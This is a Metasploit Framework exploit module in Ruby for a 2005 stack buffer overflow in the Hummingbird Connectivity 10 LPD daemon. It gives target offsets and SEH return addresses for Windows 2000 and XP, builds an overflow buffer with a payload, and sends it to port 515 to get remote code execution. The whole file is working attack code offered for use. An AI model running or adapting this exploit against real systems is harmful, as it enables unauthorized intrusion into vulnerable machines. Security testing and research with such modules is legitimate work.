##
# $Id: hummingbird_exceed.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Hummingbird Connectivity 10 SP5 LPD Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Hummingbird Connectivity
				10 LPD Daemon. This module has only been tested against Hummingbird
				Exceed v10 with SP5.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					['CVE', '2005-1815'],
					['OSVDB', '16957'],
					['BID', '13788'],
				],
			'Privileged'     => true,

			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00\x0a",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Windows 2000 English SP0-SP4', { 'Offset' => 1620, 'Ret' => 0x75022ac4 }],
					['Windows XP English SP0/SP1',   { 'Offset' => 1596, 'Ret' => 0x71aa2461 }],
				],

			'DisclosureDate' => 'May 27 2005'))

		register_options( [ Opt::RPORT(515) ], self.class )
	end

	def exploit
		connect

		filler = rand_text_english(target['Offset'], payload_badchars)
		seh    = generate_seh_payload(target.ret)
		sploit = filler + seh

		print_status("Trying target #{target.name}...")
		sock.put(sploit)

		handler
		disconnect
	end

end